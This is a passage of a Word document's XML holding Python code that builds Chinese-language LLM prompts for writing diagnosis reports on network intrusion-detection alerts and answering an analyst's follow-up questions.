        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            lines.append(f"- {item}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8DA27C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "\n".join(lines) or "- （无）"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E155A39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EFBDC6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F999369">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _fmt_proba(proba) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C74A3B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not proba:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBBDE40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return "（无）"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69916B00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ordered = sorted(proba.items(), key=lambda kv: -kv[1])[:3]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEFD119">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "，".join(f"{k} {v:.1%}" for k, v in ordered)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FD7FE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7564F18B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42B88D6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _fmt_chunks(chunks) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB1108D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not chunks:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BFF594">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return "（未检索到相关资料）"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5838674C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "\n\n".join(f"[{c.get('title', '资料')}] {c.get('text', '')}" for c in chunks)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C61FE5F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BA0A1C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54F694BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def build_diagnosis(alert: dict, evidence, chunks) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A970D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if alert.get("source") == "rule":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD1D6DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 规则告警没有"各类概率"，也不能把 strength 说成置信度</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC15BE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        head = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AED5137">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"【命中来源】阈值规则（确定性判据，不是分类模型）\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321B194C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"【命中类别】{alert.get('category')}　"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D1A57C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"超出阈值 {float(alert.get('confidence', 0)):.2f} 倍　风险等级 {alert.get('risk')}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1609D0CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F40776">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFB6741">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        head = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="158929D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"【分类结果】{alert.get('category')}　"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D0BB3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"置信度 {float(alert.get('confidence', 0)):.1%}　风险等级 {alert.get('risk')}\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA4CB5F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"【各类概率】{_fmt_proba(alert.get('proba'))}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2B290B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE2C8CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return f"""请为下面这条告警写诊断报告。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71266509">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F06FBB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{head}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E53D2DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>【探针】{alert.get('probe_id')}　【流标识】{alert.get('flow_key')}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1499ED74">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C28F0B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>【该流偏离训练分布最明显的特征】</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727C0FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{_fmt_evidence(evidence)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B8F86F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E2E5366">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>【检索到的协议资料（供原理回顾参考，引用时不必标注来源）】</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105CC863">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{_fmt_chunks(chunks)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E519A43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5754D5DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>只输出 JSON。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193400B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EAE9084">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="227D62D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def build_chat(report_markdown: str, history, question: str) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A69BB58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    turns = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C2266C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for msg in history or []:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACA474A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        role = "分析员问" if msg.get("role") == "user" else "你答"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF5A7B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        turns.append(f"{role}：{msg.get('content', '')}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF583C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    convo = "\n".join(turns) or "（这是第一个问题）"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322FB9DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return f"""以下是你之前为一条告警写的诊断报告：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171AE6DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B8FE8DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{report_markdown}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213F274D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0046D7C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>后续对话：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60EC708D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{convo}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AB5AC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="256F52B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>分析员现在问：{question}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A501D36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33298436">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>请直接回答，控制在 300 字以内。仍然遵守"不编造证据"的约束；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9482A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>如果问题超出了报告里的数据范围，明确说明"报告里没有这个信息"，不要猜。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC3296C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24383BA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24FEEBD2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def build_prompt_preview(alert: dict, evidence, chunks) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75047F1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
